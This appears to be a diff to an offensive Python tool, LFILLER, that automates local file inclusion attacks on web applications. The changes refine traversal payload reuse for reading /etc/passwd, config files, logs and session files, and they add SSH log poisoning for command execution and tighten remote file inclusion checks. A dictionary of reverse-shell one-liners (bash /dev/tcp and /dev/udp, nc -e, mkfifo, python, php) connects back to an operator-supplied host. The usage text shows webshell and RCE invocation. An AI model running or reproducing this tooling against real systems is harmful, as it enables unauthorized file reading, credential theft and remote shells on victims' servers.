@@ -180,6 +180,13 @@ class LFILLER:
             '/etc/master.passwd', '/etc/resolv.conf', '/etc/fstab'
         ]
 
+    def _get_smart_prefix(self, param):
+        """Helper: Retrieve working LFI prefix from Phase 1 if available"""
+        working_payload = next((x['payload'] for x in self.results['lfi_params'] if x['param'] == param), None)
+        if working_payload and 'etc/passwd' in working_payload:
+            return working_payload.split('etc/passwd')[0]
+        return None
+
     def _apply_encoding(self, payload):
         """Bypass WAF with complex and WSTG-v4.2 industrial logic"""
         results = [payload]
@@ -300,21 +307,31 @@ class LFILLER:
         if any(err in content.lower() for err in ['error', 'not found', 'forbidden', 'warning']): return False
         if '/etc/passwd' in file_path and 'root:x:' in content: return True
         if 'config' in file_path.lower() and ('password' in content.lower() or 'database' in content.lower()): return True
-        if 'knockd.conf' in file_path and ('[options]' in content or 'sequence' in content): return True
+        if 'knockd.conf' in file_path and ('[options]' in content.lower() or 'sequence' in content.lower()): return True
         return len(content) > 50 and not content.startswith('<')
 
     def enumerate_files(self, param):
         print(f"[*] Enumerating {len(self.interesting_files)} files on {Colors.CYAN}{param}{Colors.END}...")
+        
         for file_path in self.interesting_files:
-            for encoded in self._apply_encoding(file_path):
+            # 1. Try Smart Prefix First (High Confidence)
+            prefix = self._get_smart_prefix(param)
+            current_payloads = [prefix + file_path.lstrip('/')] if prefix else []
+            
+            # 2. Fallback / Robustness
+            current_payloads.extend(self._apply_encoding(file_path)) 
+
+            for encoded in current_payloads:
                 separator = '&' if '?' in self.url else '?'
                 test_url = f"{self.url}{separator}{param}={encoded}"
                 try:
                     r = self.session.get(test_url, timeout=self.timeout)
                     if self._check_file_readable(r.text, file_path):
                         with self.lock:
-                            self.results['readable_files'].append((file_path, r.text[:200], test_url))
-                            print(f" {Colors.GREEN}[+]{Colors.END} Readable: {file_path}")
+                            # Avoid duplicates
+                            if not any(f[0] == file_path for f in self.results['readable_files']):
+                                self.results['readable_files'].append((file_path, r.text[:200], test_url))
+                                print(f" {Colors.GREEN}[+]{Colors.END} Readable: {file_path}")
                         break
                 except: continue
 
@@ -324,7 +341,11 @@ class LFILLER:
         readable_logs = []
         
         for log in logs:
-            for encoded in self._apply_encoding(log):
+            # Smart Reuse
+            prefix = self._get_smart_prefix(param)
+            payloads = [prefix + log.lstrip('/')] if prefix else self._apply_encoding(log)
+            
+            for encoded in payloads:
                 separator = '&' if '?' in self.url else '?'
                 test_url = f"{self.url}{separator}{param}={encoded}"
                 try:
@@ -383,7 +404,11 @@ class LFILLER:
 
         for path in session_paths:
             full_path = path + php_sessid
-            for encoded in self._apply_encoding(full_path):
+            # Smart Reuse
+            prefix = self._get_smart_prefix(param)
+            payloads = [prefix + full_path.lstrip('/')] if prefix else self._apply_encoding(full_path)
+
+            for encoded in payloads:
                 separator = '&' if '?' in self.url else '?'
                 test_url = f"{self.url}{separator}{param}={encoded}"
                 try:
@@ -398,9 +423,13 @@ class LFILLER:
     def check_file_descriptors(self, param):
         """File Descriptor brute-forcing (/proc/self/fd/N)"""
         print(f"[*] Brute-forcing file descriptors on {Colors.CYAN}{param}{Colors.END}...")
+        prefix = self._get_smart_prefix(param)
+        
         for i in range(0, 20):
             fd_path = f"/proc/self/fd/{i}"
-            for encoded in self._apply_encoding(fd_path):
+            payloads = [prefix + fd_path.lstrip('/')] if prefix else self._apply_encoding(fd_path)
+            
+            for encoded in payloads:
                 separator = '&' if '?' in self.url else '?'
                 test_url = f"{self.url}{separator}{param}={encoded}"
                 try:
@@ -429,7 +458,11 @@ class LFILLER:
             sock.close()
             time.sleep(3)
             
-            log_url = f"{self.url}{'&' if '?' in self.url else '?'}{param}=/var/log/auth.log"
+            log_path = "/var/log/auth.log"
+            prefix = self._get_smart_prefix(param)
+            final_path = (prefix + log_path.lstrip('/')) if prefix else log_path
+            
+            log_url = f"{self.url}{'&' if '?' in self.url else '?'}{param}={final_path}"
             test_url = f"{log_url}&ssh_cmd=echo SSH_POISON_SUCCESS"
             r = self.session.get(test_url, timeout=5)
             if 'SSH_POISON_SUCCESS' in r.text:
@@ -514,9 +547,14 @@ class LFILLER:
         print(f"\n[*] Executing reverse shells to {Colors.CYAN}{self.lhost}:{self.lport}{Colors.END}")
         
         reverse_shells = {
-            'bash': f'bash -i >& /dev/tcp/{self.lhost}/{self.lport} 0>&1',
+            'bash_tcp': f'bash -i >& /dev/tcp/{self.lhost}/{self.lport} 0>&1',
+            'bash_fd': f'0<&196;exec 196<>/dev/tcp/{self.lhost}/{self.lport}; sh <&196 >&196 2>&196',
+            'sh_fd_5': f'exec 5<>/dev/tcp/{self.lhost}/{self.lport};cat <&5 | while read line; do $line 2>&5 >&5; done',
+            'sh_fd_direct': f'sh -i 5<> /dev/tcp/{self.lhost}/{self.lport} 0<&5 1>&5 2>&5',
+            'bash_udp': f'sh -i >& /dev/udp/{self.lhost}/{self.lport} 0>&1',
             'python': f'python3 -c "import socket,os,pty;s=socket.socket();s.connect((\'{self.lhost}\',{self.lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\'/bin/sh\')"',
-            'nc': f'nc -e /bin/sh {self.lhost} {self.lport}',
+            'nc_e': f'nc -e /bin/sh {self.lhost} {self.lport}',
+            'nc_mkfifo': f'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {self.lhost} {self.lport} >/tmp/f',
             'php': f'php -r \'$s=fsockopen("{self.lhost}",{self.lport});exec("/bin/sh -i <&3 >&3 2>&3");\''
         }
         
@@ -624,8 +662,9 @@ class LFILLER:
             # Filter chains usually result in a blank page or specific output, not a "Welcome" or "Error" page
             if r.status_code == 200:
                 content = r.text.lower()
-                if any(e in content for e in ['error', 'warning', 'not found', 'failed to open', '404', 'forbidden']):
-                    return # Likely a custom error page returning 200
+                # STRICTER FALSE POSITIVE CHECK
+                if any(e in content for e in ['file does not exist', 'error', 'warning', 'not found', 'failed to open', '404', 'forbidden']):
+                    return 
 
                 # If the response is HUGE (normal page) it's likely just ignored the filter
                 if len(r.text) > 2000: return 
@@ -706,17 +745,38 @@ class LFILLER:
     def check_rfi(self, param):
         if not param or not self.lhost: return
         print(f"[*] Checking RFI on {Colors.CYAN}{param}{Colors.END}...")
+    
+        # Get Baseline (Normal Page)
+        try:
+            baseline = self.session.get(self.url, timeout=5)
+            baseline_len = len(baseline.text)
+        except: baseline_len = 0
+
         test_urls = [f'http://{self.lhost}:8000/test.php', f'http://{self.lhost}/test.php']
         for rfi_url in test_urls:
             separator = '&' if '?' in self.url else '?'
             test_url = f"{self.url}{separator}{param}={rfi_url}"
             try:
                 r = self.session.get(test_url, timeout=5)
+                # RFI Logic: 
+                # 1. Must be 200 OK
+                # 2. Must NOT match baseline length (if it just ignored the include, it's baseline)
+                # 3. Must NOT contain standard errors
                 if r.status_code == 200:
-                    with self.lock:
-                        self.results['rfi'] = True
-                        print(f" {Colors.GREEN}[+]{Colors.END} RFI might work: {rfi_url}")
-                        break
+                    is_false_positive = False
+                    
+                    # If content is identical to baseline (within 50 bytes variance), it's likely ignored
+                    if abs(len(r.text) - baseline_len) < 50: is_false_positive = True
+                    
+                    # Check for error text
+                    if any(e in r.text.lower() for e in ['failed to open', 'include_path', 'error', 'not found', 'forbidden']): is_false_positive = True
+                    
+                    if not is_false_positive:
+                        with self.lock:
+                            self.results['rfi'] = True
+                            print(f" {Colors.GREEN}[+]{Colors.END} RFI might work: {rfi_url}")
+                            print(f"     {Colors.YELLOW}NOTE:{Colors.END} Verify LHOST listener is running at {self.lhost}:8000")
+                            break
             except: continue
 
     def run(self):
@@ -920,13 +980,10 @@ class LFILLER:
                  snippet = content.replace('\n', ' ').strip()[:50]
                  print(f"  - {Colors.CYAN}{fpath}{Colors.END}: {snippet}...")
                  
-                 # Helper: Extract Knock Sequence if found
+                 # Helper: Simple Knockd Confirmation
                  if 'knockd.conf' in fpath:
-                     import re
-                     seq = re.search(r'sequence\s*=\s*([0-9,]+)', content, re.IGNORECASE)
-                     if seq:
-                         print(f"    {Colors.YELLOW}[!] Port Knock Found:{Colors.END} {seq.group(1)}")
-                         print(f"    {Colors.YELLOW}[!] Nmap Trigger:{Colors.END} for x in {seq.group(1).replace(',', ' ')}; do nmap -Pn --host-timeout 201 --max-retries 0 -p $x {urllib.parse.urlparse(self.url).netloc.split(':')[0]}; done")
+                     print(f"    {Colors.YELLOW}[!] Port Knock Config Found.{Colors.END}")
+                     print(f"    {Colors.YELLOW}[!] Check Manual:{Colors.END} {url}")
 
         
         # New Advanced Results
@@ -974,8 +1031,10 @@ def main():
 BASIC AUDIT (Safe for Bounty):
   python3 lfiller.py -u "http://target.com/page.php?file=" -C "PHPSESSID=..."
 
-FULL CHAIN RCE (Red Team / CTF ONLY):
-  python3 lfiller.py -u "http://target.com/page.php?file=" --rce
+ADVANCED EXPLOITATION (WebShell + RCE + Headers):
+  python3 lfiller.py -u "http://target.com/page.php?file=" \\
+    -C "PHPSESSID=val" -H "Authorization: Bearer X" \\
+    --webshell --rce -lh 192.168.45.230 -lp 4444
 
 ╔══════════════════════════════════════════════════════════╗
 ║                 ⚠️  DANGER ZONE (--rce)  ⚠️              ║
